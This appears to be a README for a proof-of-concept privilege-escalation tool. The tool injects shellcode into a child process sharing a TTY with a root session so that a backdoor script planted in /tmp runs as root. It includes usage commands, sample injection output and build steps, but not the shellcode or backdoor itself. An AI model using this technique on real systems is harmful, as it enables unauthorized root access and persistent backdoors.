
## Overview

This code allows exploiting a writing to a parent process sharing the same tty from a child. This is especially interesting when the child process is executing a less privileged user we control and the parent process is root.

The attack is described in this blog article: https://www.errno.fr/TTYPushback.html. The difference here, is that instead of backdooring a user, we directly attach to an already existing session.

This Proof Of Concept is not the cleanest one but has the advantage to work properly. It should be noted that if the targeted process is being actively used, the exploit may crash it.

## Usage

First, the backdoor `backdoor.py` must be placed on the victim system, for example in `/tmp/.sploit.py`. The given shellcode executes the script at this given location. Then:

```
./inject PID
```

For example:

```
$ ps auxwf
root      823863  0.0  0.1  15136  9104 ?        Ss   20:52   0:00  \_ sshd: root@pts/7
root      823872  0.0  0.0  11036  6752 pts/7    Ss   20:52   0:00      \_ -bash
root      826163  0.0  0.0  10320  4920 pts/7    S    21:45   0:00          \_ su - user
user      826164  0.0  0.0  11264  6968 pts/7    S+   21:45   0:00              \_ -bash
$ ./inject 826164
[+] attaching to proccess (id: 826164)
[+] mmaping shellcode and stack
[+] mem_addr: 0x7f4a3aed6000
[+] stack_addr: 0x7f4a3aed6000
[+] copying shellcode (1024 bytes)
[+] setting up child's stack
[+] starting new thead
[+] thread id: 826762
[+] setting rip in thread
[+] detaching main process
[+] detaching from thread
[+] done
```

## Building

```
git clone https://github.com/laxa/pytryce.git
cd pytryce
make
```

## Author

This project has code from the following repositories:
* https://github.com/Srakai/Adun
* https://github.com/voydstack/shellcoding

## License

This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details
